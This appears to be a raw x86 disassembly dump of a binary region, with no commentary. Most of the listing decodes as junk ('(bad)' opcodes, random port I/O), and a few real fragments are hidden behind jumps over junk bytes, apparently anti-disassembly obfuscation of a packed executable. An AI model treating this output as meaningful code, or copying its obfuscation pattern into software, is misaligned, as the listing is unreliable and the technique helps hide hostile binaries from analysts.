  425c7a:	movups xmm3,xmm6
  425c7d:	out    0xc5,eax
  425c7f:	add    BYTE PTR [edx-0x2],cl
  425c82:	pop    es
  425c83:	dec    edx
  425c84:	sbb    al,0xd1
  425c86:	xor    DWORD PTR [eax],ebx
  425c88:	add    bh,BYTE PTR [eax+0x73]
  425c8b:	ja     0x425d04
  425c8d:	sbb    eax,0x793ee3b8
  425c92:	push   edi
  425c93:	xchg   ecx,eax
  425c94:	jle    0x425cf6
  425c96:	dec    esp
  425c97:	pop    eax
  425c98:	pusha  
  425c99:	cmp    DWORD PTR [ecx-0x32],0xffffff88
  425c9d:	(bad)  
  425c9e:	mov    eax,0x49db73fd
  425ca3:	aaa    
  425ca4:	lahf   
  425ca5:	in     eax,0x4d
  425ca7:	fimul  WORD PTR [eax]
  425ca9:	push   0xffffff97
  425cab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425cac:	xchg   edi,eax
  425cad:	push   esp
  425cae:	or     DWORD PTR [esi-0x52],edi
  425cb1:	sbb    al,0x52
  425cb3:	out    dx,al
  425cb4:	mov    edi,0x3ca720c0
  425cb9:	into   
  425cba:	gs in  eax,0x55
  425cbd:	sub    eax,0x1d794dbd
  425cc2:	inc    esi
  425cc3:	repz mov ebx,0x6d959b80
  425cc9:	add    eax,0xcaef1b7c
  425cce:	lea    ebx,[esi+0x5b]
  425cd1:	leave  
  425cd2:	ret    0x8
  425cd5:	push   ebp
  425cd6:	mov    ebp,esp
  425cd8:	jmp    0x425db8
  425cdd:	stc    
  425cde:	lods   al,BYTE PTR ds:[esi]
  425cdf:	call   0xffa95a0a
  425ce4:	jmp    DWORD PTR [eax]
  425ce6:	mov    dh,BYTE PTR [edx]
  425ce8:	xor    ebp,DWORD PTR [ecx*4-0x414bfd6a]
  425cef:	add    DWORD PTR [eax],eax
  425cf1:	ret    
  425cf2:	add    BYTE PTR [eax],al
  425cf4:	add    BYTE PTR [ebp+0x22],ch
  425cf7:	mov    ch,0x56
  425cf9:	add    DWORD PTR [bx+si],esp
  425cfc:	inc    esp
  425cfd:	mov    al,ds:0xf125d1a8
  425d02:	cmp    al,0x15
  425d04:	xor    DWORD PTR [edi-0x4d],edx
  425d07:	or     DWORD PTR [edx-0x6b6ed0d1],ebp
  425d0d:	aaa    
  425d0e:	push   esi
  425d0f:	mov    al,0xca
  425d11:	xchg   edi,eax
  425d12:	or     eax,DWORD PTR es:[ecx-0x58]
  425d16:	xchg   esi,eax
  425d17:	out    0xbf,eax
  425d19:	xlat   BYTE PTR ds:[ebx]
  425d1a:	and    eax,0x9d3c6e89
  425d1f:	push   ebp
  425d20:	mov    edi,DWORD PTR [edi]
  425d22:	scas   al,BYTE PTR es:[edi]
  425d23:	daa    
  425d24:	sbb    al,0xc8
  425d26:	jge    0x425cc3
  425d28:	mov    ecx,0x44db299
  425d2d:	and    eax,0xf72f88a0
  425d32:	fimul  DWORD PTR [esi-0x7c]
  425d35:	stos   DWORD PTR es:[edi],eax
  425d36:	mov    bl,0x85
  425d38:	popf   
  425d39:	dec    edi
  425d3a:	mov    ah,0x85
  425d3c:	stos   BYTE PTR es:[edi],al
  425d3d:	jne    0x425d5a
  425d3f:	stos   DWORD PTR es:[edi],eax
  425d40:	addr16 adc cl,cl
  425d43:	repnz out 0x47,al
  425d46:	mov    eax,ds:0xc3539f33
  425d4b:	out    dx,al
  425d4c:	outs   dx,DWORD PTR ds:[esi]
  425d4d:	add    dl,bl
  425d4f:	(bad)  
  425d50:	aas    
  425d51:	jns    0x425ced
  425d53:	into   
  425d54:	retf   0xdd39
  425d57:	and    DWORD PTR [ebp-0x707e1b15],ebx
  425d5d:	mov    bl,0x48
  425d5f:	test   al,0xc3
  425d61:	in     al,0xa8
  425d63:	repnz sbb BYTE PTR [eax-0x78],ch
  425d67:	repz sbb al,0xfb
  425d6a:	adc    BYTE PTR [edx+0x4d40b612],0xbd
  425d71:	mov    cl,0x36
  425d73:	pop    ebp
  425d74:	test   BYTE PTR [ecx],ah
  425d76:	or     bh,BYTE PTR [edx]
  425d78:	pop    eax
  425d79:	xor    esp,DWORD PTR ds:[ebx-0xf]
  425d7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425d7e:	add    al,0x4d
  425d80:	inc    edx
  425d81:	das    
  425d82:	(bad)  
  425d83:	in     al,0x30
  425d85:	pop    esi
  425d86:	neg    eax
  425d88:	cmc    
  425d89:	ror    dl,0x21
  425d8c:	pushaw 
  425d8e:	inc    edi
  425d8f:	adc    ecx,DWORD PTR [ecx-0x7]
  425d92:	add    ebx,edx
  425d94:	aaa    
  425d95:	lock jmp 0xa14a:0x71846e16
  425d9d:	shr    DWORD PTR [eax-0x2e],1
  425da0:	adc    eax,0x82c822a1
  425da5:	imul   ecx,ebx,0xaf40eaa4
  425dab:	mov    dl,0x16
  425dad:	fcomi  st,st(0)
  425daf:	cmp    DWORD PTR [ecx+0x50],0x5f
  425db3:	adc    eax,0xbaeb67f8
  425db8:	and    esp,0xfffffff8
  425dbb:	sub    esp,0xbc
  425dc1:	jmp    0x425ea1
  425dc6:	popa   
  425dc7:	jns    0x425d8b
  425dc9:	xchg   edx,ebx
  425dcb:	mov    edi,0x8b8aff65
  425dd0:	xor    eax,DWORD PTR es:[esi-0x4b]
  425dd4:	mov    al,ds:0x1bf7795
  425dd9:	add    bl,al
  425ddb:	add    BYTE PTR [eax],al
  425ddd:	add    BYTE PTR [edx],ch
  425ddf:	jnp    0x425e31
  425de1:	in     eax,dx
  425de2:	repz loop 0x425e03
  425de5:	sbb    bl,BYTE PTR [edi-0x7e6e2068]
  425deb:	dec    eax
  425dec:	inc    ebx
  425ded:	daa    
  425dee:	inc    ecx
  425def:	hlt    
  425df0:	stos   DWORD PTR es:[edi],eax
  425df1:	int    0x53
  425df3:	aas    
  425df4:	gs retf 
  425df6:	out    dx,al
  425df7:	xlat   BYTE PTR ds:[ebx]
  425df8:	into   
  425df9:	je     0x425dde
  425dfb:	dec    edi
  425dfc:	loope  0x425d85
  425dfe:	xlat   BYTE PTR ds:[ebx]
  425dff:	out    0x2e,eax
  425e01:	add    BYTE PTR [edi+0x19d508a5],dh
  425e07:	jmp    0x425e3c
  425e09:	push   ecx
  425e0a:	std    
  425e0b:	inc    edx
  425e0c:	mov    edi,0xb62e801f
  425e11:	dec    ecx
  425e12:	shl    bl,0xe5
  425e15:	adc    DWORD PTR [ecx-0x30e7da99],edi
  425e1b:	in     al,0xc3
  425e1d:	or     ch,BYTE PTR [ebp+0x23]
  425e20:	imul   ecx,esp,0x960a944e
  425e26:	test   BYTE PTR [ebp-0x4dc00a39],dh
  425e2c:	mov    esi,0x1be0e3c6
  425e31:	fild   QWORD PTR [eax-0x42]
  425e34:	ret    
  425e35:	xor    edi,DWORD PTR [esi-0x24]
  425e38:	mov    esp,0xd4974690
  425e3d:	lock jo 0x425e9a
  425e40:	jb     0x425e4a
  425e42:	imul   ebp,DWORD PTR [ebx-0x79d54e5f],0xffffffe0
  425e49:	or     BYTE PTR [esi],dh
  425e4b:	sub    esi,ecx
  425e4d:	(bad)
  425e51:	jle    0x425df1
  425e53:	stos   BYTE PTR es:[edi],al
  425e54:	std    
  425e55:	jl     0x425e56
  425e57:	push   ebp
  425e58:	dec    ebx
  425e59:	sbb    ecx,DWORD PTR [ebx+0x35]
  425e5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e5d:	cli    
  425e5e:	or     BYTE PTR [eax+0x5a261bc7],bh
  425e64:	sub    bh,BYTE PTR ds:0x388d431a
  425e6a:	das    
  425e6b:	in     al,dx
  425e6c:	cmp    dh,0x16
  425e6f:	pop    esi
  425e70:	add    eax,0xb51ff1d4
  425e75:	adc    eax,0xf1ad1d1f
  425e7a:	bound  ecx,QWORD PTR [esi-0x26]
  425e7d:	push   cs
  425e7e:	test   ecx,edx
  425e80:	cmc    
  425e81:	jns    0x425ea5
  425e83:	dec    edx
  425e84:	sub    esi,DWORD PTR [edx-0x1c71df0]
  425e8a:	xor    DWORD PTR cs:[ebp+0x4b],eax
  425e8e:	cs dec ebp
  425e90:	mov    dh,0xaf
  425e92:	fidivr DWORD PTR [edx-0x55f719ed]
  425e98:	lahf   
  425e99:	push   ss
  425e9a:	addr16 clc 
  425e9c:	jb     0x425eaa
  425e9e:	imul   esi,DWORD PTR [edi-0x16a9acc2],0xdb
  425ea8:	xor    esp,DWORD PTR [edx]
  425eaa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425eab:	sub    al,0xb5
  425ead:	scas   al,BYTE PTR es:[edi]
  425eae:	mov    ebx,0xe60c453f
  425eb3:	int    0xd0
  425eb5:	mov    al,0x95
  425eb7:	in     al,0x3a
  425eb9:	rol    BYTE PTR [ecx],0x0
  425ebc:	ret    
  425ebd:	add    BYTE PTR [eax],al
  425ebf:	add    BYTE PTR [ebx-0x40],bh
  425ec2:	add    al,0x87
  425ec4:	xor    esp,edx
  425ec6:	aam    0x33
  425ec8:	or     DWORD PTR [ebx+eiz*1],esi
  425ecb:	jge    0x425e4f
  425ecd:	fwait
  425ece:	and    edi,DWORD PTR [ebp+ecx*2-0x4e]
  425ed2:	inc    esp
  425ed3:	hlt    
  425ed4:	into   
  425ed5:	int    0xff
  425ed7:	pop    ss
  425ed8:	xor    esp,DWORD PTR [edi]
  425eda:	jae    0x425f29
  425edc:	jl     0x425eab
  425ede:	sub    eax,0x6bea8635
  425ee3:	adc    eax,0x77bb823d
  425ee8:	pop    edi
  425ee9:	call   0x5ea16a9f
  425eee:	xor    DWORD PTR [ebx-0x5aad82b0],edx
  425ef4:	sub    al,0x8e
  425ef6:	cmp    BYTE PTR [ebx+ebp*8-0x6da7c5c9],cl
  425efd:	std    
  425efe:	or     DWORD PTR [eax],edx
  425f00:	inc    edx
  425f01:	mov    eax,0x5618734c
  425f06:	cmp    al,0x34
  425f08:	out    0x15,al
  425f0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f0b:	dec    edx
  425f0c:	outs   dx,DWORD PTR ds:[esi]
  425f0d:	push   cs
  425f0e:	cmp    eax,0x431945d5
  425f13:	pop    edx
  425f14:	in     eax,dx
  425f15:	pop    edx
  425f16:	add    BYTE PTR [ebp-0x3d301be2],0x6
  425f1d:	dec    edi
  425f1e:	nop
  425f1f:	push   0x3b08695
  425f24:	push   es
  425f25:	popf   
  425f26:	or     DWORD PTR [edi-0x5da0c09e],eax
  425f2c:	cdq    
  425f2d:	pop    ebp
  425f2e:	pop    esi
  425f2f:	and    ecx,DWORD PTR ss:[eax+0x16]
  425f33:	ins    DWORD PTR es:[edi],dx
  425f34:	add    BYTE PTR [edx+ebx*2],dh
  425f37:	ret    
  425f38:	add    ebx,esi
  425f3a:	adc    al,al
  425f3c:	inc    edi
  425f3d:	sub    DWORD PTR gs:[edi],ecx
  425f40:	inc    ebx
  425f41:	xchg   esi,eax
  425f42:	inc    ebx
  425f43:	inc    ebp
  425f44:	mov    bh,0x10
  425f46:	pop    ebp
  425f47:	and    ebx,esp
  425f49:	ins    BYTE PTR es:[edi],dx
  425f4a:	jns    0x425f5d
  425f4c:	mov    dh,0x38
  425f4e:	jbe    0x425f0f
  425f50:	xor    ebp,esi
  425f52:	xor    eax,0x9d859665
  425f57:	and    DWORD PTR [ecx],edx
  425f59:	cdq    
  425f5a:	add    eax,0x415d9507
  425f5f:	aam    0xc0
  425f61:	adc    eax,DWORD PTR [eax+0x2e]
  425f64:	dec    ebx
  425f65:	ds mov bh,0xe1
  425f68:	dec    ebp
  425f69:	inc    ebp
  425f6a:	xor    al,BYTE PTR [ebp+eax*8-0x39c52e5b]
  425f71:	pop    ebp
  425f72:	pop    edx
  425f73:	ja     0x425fa1
  425f75:	xor    al,0x5d
  425f77:	add    edx,DWORD PTR ds:0xa06c89b8
  425f7d:	pusha  
  425f7e:	fdivr  DWORD PTR [ecx+0x1d]
  425f81:	dec    edx
  425f82:	adc    BYTE PTR [edi+0x6a],0x0
  425f86:	jmp    0x426066
  425f8b:	sub    DWORD PTR [edi+0x6adf2ad7],esi
  425f91:	std    
  425f92:	mov    bh,0x8c
  425f94:	sub    al,0xd9
  425f96:	xor    edi,DWORD PTR ds:0xfda59d3b
  425f9c:	rol    BYTE PTR [ecx],0x0
  425f9f:	ret    
  425fa0:	add    BYTE PTR [eax],al
  425fa2:	add    BYTE PTR [edi-0x3244359c],dh
  425fa8:	aaa    
  425fa9:	fistp  WORD PTR [edx]
  425fab:	aad    0xd1
  425fad:	cmc    
  425fae:	mov    ds:0xfe24567a,eax
  425fb3:	inc    edi
  425fb4:	repz aas 
  425fb6:	(bad)  
  425fb7:	pop    ebx
  425fb8:	lea    esi,[ebx+0x1f]
  425fbb:	mov    al,BYTE PTR [ebx-0x23]
  425fbe:	aaa    
  425fbf:	hlt    
  425fc0:	cld    
  425fc1:	cli    
  425fc2:	loopne 0x425fc3
  425fc4:	mov    ebx,0xa3028438
  425fc9:	(bad)  
  425fca:	cmp    eax,0x204bc28d
  425fcf:	fmul   st(1),st
  425fd1:	pop    ebp
  425fd2:	push   esi
  425fd3:	aad    0xc2
  425fd5:	repnz fild QWORD PTR [esi-0x53609355]
  425fdc:	sub    al,BYTE PTR [eax+0x1e]
  425fdf:	cmp    BYTE PTR [esi],al
  425fe1:	xor    eax,0xc711762d
  425fe6:	gs loopne 0x426031
  425fe9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425fea:	xchg   ecx,eax
  425feb:	test   bl,ah
  425fed:	dec    ebx
  425fee:	call   0xb62f6c61
  425ff3:	add    cl,al
  425ff5:	xchg   esp,eax
  425ff6:	inc    ebp
  425ff7:	inc    eax
  425ff8:	fsubp  st(3),st
  425ffa:	dec    ecx
  425ffb:	popf   
  425ffc:	out    0xb3,eax
  425ffe:	jg     0x42600d
  426000:	mov    dh,BYTE PTR [edx-0x3e5ebd04]
  426006:	mov    BYTE PTR [edx+edx*1],bl
  426009:	fwait
  42600a:	jp     0x42601c
  42600c:	in     eax,dx
  42600d:	pop    es
  42600e:	dec    esp
  42600f:	je     0x426070
  426011:	arpl   bx,dx
  426013:	cdq    
  426014:	push   ebp
  426015:	xchg   BYTE PTR [ecx-0x65],dl
  426018:	frndint 
  42601a:	imul   ebp,DWORD PTR [eax-0x2973cee5],0xc35d7cda
  426024:	xlat   BYTE PTR ds:[ebx]
  426025:	aaa    
  426026:	xchg   edi,eax
  426027:	and    al,0x2b
  426029:	in     al,0xf9
  42602b:	rol    DWORD PTR [ebp-0x6253ec99],cl
  426031:	ins    DWORD PTR es:[edi],dx
  426032:	mov    eax,ds:0x9c786011
  426037:	jnp    0x426032
  426039:	sub    eax,DWORD PTR [ebp+0x30]
  42603c:	mov    bl,0x65
  42603e:	sahf   
  42603f:	imul   edi,eax,0x524e54a0
  426045:	shl    BYTE PTR [eax+ecx*2],0x68
  426049:	clc    
  42604a:	xchg   BYTE PTR [ecx-0x47239056],al
  426050:	xchg   DWORD PTR [eax],eax
  426052:	xchg   esi,eax
  426053:	cdq    
  426054:	pop    ebp
  426055:	repnz mov dl,0x99
  426058:	pop    edx
  426059:	jecxz  0x425fe5
  42605b:	xchg   BYTE PTR [edx-0x59e7b4d0],ah
  426061:	mov    eax,DWORD PTR [ecx-0x41fb8371]
  426067:	fdiv   st,st(2)
  426069:	inc    edx
  42606a:	add    cl,ch
  42606c:	fild   DWORD PTR [eax]
  42606e:	add    BYTE PTR [eax],al
  426070:	push   ebx
  426071:	call   0xe0023ba2
  426076:	imul   eax
  426078:	ret    0xb8a8
  42607b:	or     eax,0x3feccdd1
  426080:	rol    cl,0x1
  426083:	add    bl,al
  426085:	add    BYTE PTR [eax],al
  426087:	add    cl,ah
  426089:	inc    eax
  42608a:	jp     0x4260bd
  42608c:	(bad)  
  42608e:	jne    0x426011
  426090:	out    0x9d,eax
  426092:	dec    edi
  426093:	shl    dl,cl
  426095:	pop    esp
  426096:	mov    ds:0xe40b8cc,al
  42609b:	mov    BYTE PTR cs:[ecx+0x77fd4c6a],dl
  4260a2:	pop    eax
  4260a3:	data16 test BYTE PTR ss:[esi],ah
  4260a7:	mov    al,ds:0x2340eacf
  4260ac:	or     eax,0x928d9314
  4260b1:	sbb    ebp,DWORD PTR [ebx+0x51]
  4260b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260b5:	push   edi
  4260b6:	lods   eax,DWORD PTR ds:[esi]
  4260b7:	es int 0xc8
  4260ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260bb:	mov    esp,0x919fd31b
  4260c0:	shl    BYTE PTR [eax+eax*2+0x54],cl
  4260c4:	sub    eax,DWORD PTR [ebp-0x1]
  4260c7:	mov    dh,0xe4
  4260c9:	cs addr16 js 0x4260c4
  4260cd:	jne    0x4260e4
  4260cf:	popf   
  4260d0:	dec    edi
  4260d1:	cmp    eax,0x98771cf
  4260d6:	idiv   BYTE PTR [ecx-0x7f]
  4260d9:	cld    
  4260da:	mov    ds:0xcfbb28c5,al
  4260df:	int    0x38
  4260e1:	pusha  
  4260e2:	mov    esp,0x5a68708c
  4260e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4260e8:	cmp    eax,0xa1fc5fb4
  4260ed:	mov    al,ds:0x4f945480
  4260f2:	jns    0x4260a1
  4260f4:	popf   
  4260f5:	xchg   DWORD PTR [ecx+0x6d],ebp
  4260f8:	push   esi
  4260f9:	imul   ebx,DWORD PTR [eax-0x48],0x13cae3ab
  426100:	mov    edi,0x80ee8c8c
  426105:	stc    
  426106:	sti    
  426107:	scas   al,BYTE PTR es:[edi]
  426108:	add    edx,DWORD PTR [esi+eiz*2+0x25]
  42610c:	jecxz  0x42609d
  42610e:	ret    
  42610f:	sbb    esp,ebp
  426111:	(bad)  
  426112:	mov    ecx,0x97d7d060
  426117:	sub    edi,eax
  426119:	icebp  
  42611a:	out    0x37,al
  42611c:	jl     0x42610e
  42611e:	pop    es
  42611f:	xor    edi,DWORD PTR [esi-0x53]
  426122:	jecxz  0x4260d3
  426124:	in     eax,dx
  426125:	inc    edx
  426126:	adc    edi,ebp
  426128:	(bad)  
  42612a:	mov    ds:0xe9fb13fd,al
  42612f:	mov    eax,0x7311c5f
  426134:	mul    DWORD PTR [ecx+0x1d]
  426137:	outs   dx,DWORD PTR ds:[esi]
  426138:	push   0x6a262c24
  42613d:	sbb    DWORD PTR [edi-0x1ab6e8be],edi
  426143:	mov    esi,0xece6e454
  426148:	popa   
  426149:	call   0x15ff:0x6a56d6
  426150:	les    eax,FWORD PTR [edi+0x408a0043]
  426156:	add    DWORD PTR [edx],edi
  426158:	add    eax,0x42f2da
  42615d:	je     0x42616b
  426163:	xor    eax,eax
  426165:	inc    eax
  426166:	jmp    0x42a019
  42616b:	and    DWORD PTR ds:0x42f564,0x1b6e
  426175:	push   esi
  426176:	add    DWORD PTR ds:0x42f598,0x2352
  426180:	lea    eax,[esp+0x8c]
  426187:	sbb    DWORD PTR ds:0x42f668,0x42f5b0
  426191:	push   eax
  426192:	call   DWORD PTR ds:0x4387e0
  426198:	mov    DWORD PTR ds:0x42f614,0x7a14
  4261a2:	mov    al,BYTE PTR [eax]
  4261a4:	cmp    al,BYTE PTR ds:0x42f2d8
  4261aa:	mov    DWORD PTR ds:0x42f628,0x190e
  4261b4:	jne    0x426163
  4261ba:	jmp    0x42629a
  4261bf:	inc    ebx
  4261c0:	mov    ds:0xbff81f18,eax
  4261c5:	inc    edi
  4261c6:	dec    DWORD PTR [edx+edx*2+0x37]
  4261ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261cb:	jg     0x4261a1
  4261cd:	xchg   edi,eax
  4261ce:	xor    eax,DWORD PTR [ebx-0x3cfffe3e]
  4261d4:	add    BYTE PTR [eax],al
  4261d6:	add    BYTE PTR [ebx+eiz*1],bl
  4261d9:	test   BYTE PTR [esi+0x79d845a],0x3e
  4261e0:	push   0xaa9a5f41
  4261e5:	push   edi
  4261e6:	shr    BYTE PTR [edi+0x6],0x22
  4261ea:	pop    ss
  4261eb:	loopne 0x4261e3
  4261ed:	mov    esi,0x2ef8b6e0
  4261f2:	or     BYTE PTR [ecx-0x31],ah
  4261f5:	xchg   BYTE PTR [edx],cl
  4261f7:	xor    ch,BYTE PTR [edi]
  4261f9:	sahf   
  4261fa:	jmp    FWORD PTR [ecx-0x7d]
  4261fd:	repnz cli 
  4261ff:	jnp    0x426233
  426201:	js     0x4261ed
  426203:	test   al,0x5b
  426205:	enter  0x8a4e,0x8d
  426209:	lea    esp,[eax]
  42620b:	xchg   ebp,eax
  42620c:	mov    bl,0x4e
  42620e:	or     eax,0x7f55a261
  426213:	data16 sti 
  426215:	das    
  426216:	dec    eax
  426217:	and    eax,0xff7479ff
  42621c:	cmp    dh,BYTE PTR [edi+ebp*1]
  42621f:	in     eax,dx
  426220:	hlt    
  426221:	mov    edi,0xa7cba2d3
  426226:	xor    dl,BYTE PTR [eax-0x7e]
  426229:	xchg   esp,eax
  42622a:	dec    eax
  42622b:	test   al,0x63
  42622d:	test   DWORD PTR [eax+0x17c0a3ed],0x1d9df608
  426237:	out    0x83,eax
  426239:	mov    al,BYTE PTR [ecx-0x7d]
  42623c:	push   0x5d
  42623e:	jb     0x426228
  426240:	clc    
  426241:	xchg   esp,eax
  426242:	clc    
  426243:	xor    al,0xfa
  426245:	push   ds
  426246:	shl    BYTE PTR [eax+0x7c],cl
  426249:	mov    eax,ds:0xf6d4207
  42624e:	mov    ebx,0xad61d7f5
  426253:	adc    eax,0xe4eecccf
  426258:	jecxz  0x426278
  42625a:	inc    esi
  42625b:	in     eax,0xda
  42625d:	jns    0x4261ea
  42625f:	cs icebp 
  426261:	push   esp
  426262:	sbb    al,al
  426264:	push   0x90bf14b8
  426269:	mov    cs,esp
  42626b:	int    0x70
  42626d:	adc    BYTE PTR [edi],dl
  42626f:	sar    DWORD PTR [edi+0x33fd2c73],0x24
  426276:	lahf   
  426277:	lods   al,BYTE PTR ds:[esi]
  426278:	jg     0x4262c9
  42627a:	(bad)  [edi]
  42627c:	in     eax,0x37
  42627e:	lea    edx,[eax-0x16dbcd79]
  426284:	test   DWORD PTR [edx+edi*2-0x1a],0x30988f7d
  42628c:	repnz and BYTE PTR [edi-0xa],dh
  426290:	push   ecx
  426291:	ins    DWORD PTR es:[edi],dx
  426292:	sub    al,0xe9
  426294:	or     ecx,eax
  426296:	adc    BYTE PTR [edx-0x5],ch
  426299:	inc    esp
  42629a:	mov    DWORD PTR [esp+0x10],0xebeb4fd3
  4262a2:	jmp    0x426382
  4262a7:	sbb    edx,esp
  4262a9:	push   edi
  4262aa:	sahf   
  4262ab:	fistp  WORD PTR [edi+0x497cd5db]
  4262b1:	les    esi,FWORD PTR [edx+ecx*8+0x55]
  4262b5:	sbb    al,0x69
  4262b7:	inc    esi
  4262b8:	ret    
  4262b9:	add    DWORD PTR [eax],eax
  4262bb:	ret    
  4262bc:	add    BYTE PTR [eax],al
  4262be:	add    BYTE PTR [eax-0x43],bh
  4262c1:	mov    bl,0xaf
  4262c3:	mov    ah,0xeb
  4262c5:	and    DWORD PTR [ebp+0x9ac4f60],esi
  4262cb:	jbe    0x4262a3
  4262cd:	jle    0x4262fe
  4262cf:	xchg   ebp,eax
  4262d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4262d1:	(bad)  
  4262d2:	out    0x10,al
  4262d4:	in     eax,dx
  4262d5:	in     al,0x9e
  4262d7:	bound  ecx,QWORD PTR [esi]
  4262d9:	xor    BYTE PTR [esi-0x14],dh
  4262dc:	shr    BYTE PTR [edx-0x2d3becac],0x47
  4262e3:	imul   BYTE PTR [edi+0x715ec7e2]
  4262e9:	fwait
  4262ea:	mov    al,0x54
  4262ec:	and    ecx,DWORD PTR [ebp+0x7f31269e]
  4262f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4262f3:	jl     0x4262f9
  4262f5:	stc    
  4262f6:	xor    ebx,esp
  4262f8:	sub    BYTE PTR [esi+0x7a],dl
  4262fb:	mov    esp,0xe310702
  426300:	nop
  426301:	jecxz  0x4262d8
  426303:	mov    bh,0xfa
  426305:	ds int3 
  426307:	push   0x70
  426309:	stos   BYTE PTR es:[edi],al
  42630a:	xchg   esi,eax
  42630b:	out    0xd4,eax
  42630d:	and    al,0x60
  42630f:	hlt    
  426310:	add    dl,cl
  426312:	into   
  426313:	inc    ebx
  426314:	gs jb  0x426318
  426317:	jle    0x4262e8
  426319:	cmp    bl,BYTE PTR [ebp-0x351f6245]
  42631f:	adc    bl,dh
  426321:	cmp    eax,0x69ab5d6e
  426326:	call   0x47c27f8e
  42632b:	fsubr  DWORD PTR [ecx-0x3b1fe0be]
  426331:	icebp  
  426332:	stos   BYTE PTR es:[edi],al
  426333:	inc    eax
  426334:	imul   DWORD PTR [ebp+0x12bbe354]
  42633a:	sbb    al,0x82
  42633c:	sub    esp,DWORD PTR [esi-0x7a139e23]
  426342:	dec    edx
  426343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426344:	xchg   DWORD PTR [ecx+esi*2+0x23a8a5bf],esi
  42634b:	pop    ds
  42634c:	fldcw  WORD PTR [edx-0x10]
  42634f:	pushf  
  426350:	cmp    BYTE PTR [edx-0x3a719ea1],ah
  426356:	(bad)  
  426357:	mov    bl,BYTE PTR [ecx+0x26]
  42635a:	or     DWORD PTR [eax],eax
  42635c:	rol    BYTE PTR [edi+0x373a53c2],1
  426362:	cmp    BYTE PTR ds:[ebp-0x416e77da],bh
  426369:	and    edx,0x674cdf38
  42636f:	push   esp
  426370:	scas   al,BYTE PTR es:[edi]
  426371:	test   edx,ecx
  426373:	arpl   WORD PTR [ebp+0xf],ax
  426376:	jle    0x4262f9
  426378:	out    dx,eax
  426379:	push   esp
  42637a:	sub    esi,DWORD PTR [eax-0x5cb3cff4]
  426380:	add    bl,BYTE PTR [esi-0x212345]
  426386:	inc    DWORD PTR [ebx+0x42f6003d]
  42638c:	add    BYTE PTR [eax],al
  42638e:	jl     0x4263a8
  426394:	adc    DWORD PTR ds:0x42f608,edx
  42639a:	jmp    0x4263a8
  42639f:	push   DWORD PTR [ebp-0x18]
  4263a2:	call   DWORD PTR ds:0x4387e8
  4263a8:	mov    DWORD PTR [esp+0x14],ebx
  4263ac:	mov    DWORD PTR [esp+0x58],0xebeb4fd4
  4263b4:	mov    DWORD PTR [esp+0x5c],ebx
  4263b8:	lea    eax,[esp+0x64]
  4263bc:	jmp    0x42649c
  4263c1:	retf   0xb4c1
  4263c4:	push   ds
  4263c5:	mov    edi,0x6dd5ea7f
  4263ca:	out    dx,eax
  4263cb:	pop    ebx
  4263cc:	dec    esi
  4263cd:	shr    BYTE PTR ds:0xc409a18e,1
  4263d3:	add    DWORD PTR [eax],eax
  4263d5:	ret    
  4263d6:	add    BYTE PTR [eax],al
  4263d8:	add    BYTE PTR [ebp-0x6fc51b14],bh
  4263de:	adc    edx,DWORD PTR [ecx-0x1f]
  4263e1:	loopne 0x4263dc
  4263e3:	fstp   DWORD PTR cs:[ecx-0x44f40a93]
  4263ea:	sbb    al,BYTE PTR [esp+ebx*8+0x13]
  4263ee:	ds push edx
  4263f0:	inc    esp
  4263f1:	push   0x47365d0c
  4263f6:	scas   eax,DWORD PTR es:[edi]
  4263f7:	sbb    eax,0xc014efc9
  4263fd:	jecxz  0x42639e
  4263ff:	add    edi,ebx
  426401:	mov    WORD PTR [ecx],fs
  426403:	enter  0x6cc4,0xa9
  426407:	cwde   
  426408:	lea    ecx,[ebp-0x4e]
  42640b:	pop    ds
  42640c:	pusha  
  42640d:	repnz cld 
  42640f:	inc    edx
  426410:	xchg   esp,eax
  426411:	and    DWORD PTR [ebx],eax
  426413:	push   edx
  426414:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426415:	(bad)  
  426416:	out    0xae,al
  426418:	push   edi
  426419:	in     eax,dx
  42641a:	pop    esp
  42641b:	arpl   WORD PTR [eax+0x66],bp
  42641e:	nop
  42641f:	xchg   esi,eax
  426420:	ins    BYTE PTR es:[edi],dx
  426421:	(bad)  
  426422:	test   BYTE PTR [edi-0x7973d11b],0x8f
  426429:	add    DWORD PTR [ebx-0x5],0xffffffe7
  42642d:	pop    edx
  42642e:	mov    ebp,0xd69f01ed
  426433:	fwait
  426434:	push   si
  426436:	cld    
  426437:	mov    al,ds:0x856ab294
  42643c:	dec    edi
  42643d:	loop   0x4263dc
  42643f:	into   
  426440:	adc    cl,al
  426442:	pushf  
  426443:	push   ebx
  426444:	jne    0x426428
  426446:	data16 test al,0xe4
  426449:	js     0x426405
  42644b:	pusha  
  42644c:	pop    ss
  42644d:	or     esp,ecx
  42644f:	sbb    BYTE PTR [esi],0x3
  426452:	sub    esi,eax
  426454:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426455:	pusha  
  426456:	out    0xd7,eax
  426458:	out    0x6c,al
  42645a:	sbb    BYTE PTR [ebx],al
  42645c:	in     eax,0x53
  42645e:	loope  0x4264b9
  426460:	call   0x71f7d5dc
  426465:	mov    bl,0x85
  426467:	adc    al,0x96
  426469:	sub    ax,0x7837
  42646d:	xchg   ecx,eax
  42646e:	scas   eax,DWORD PTR es:[edi]
  42646f:	push   cs
  426470:	mov    ebx,0xc388fd7d
  426475:	cli    
  426476:	iret   
  426477:	mov    edi,?
  426479:	fdiv   DWORD PTR [ebp+edx*4+0x15]
  42647d:	sbb    bh,BYTE PTR [edx]
  42647f:	rcl    esp,1
  426481:	test   al,0xc0
  426483:	mov    BYTE PTR [ecx+esi*8],cl
  426486:	fidiv  DWORD PTR [ecx+0x6959e39e]
  42648c:	aad    0xe2
  42648e:	dec    edi
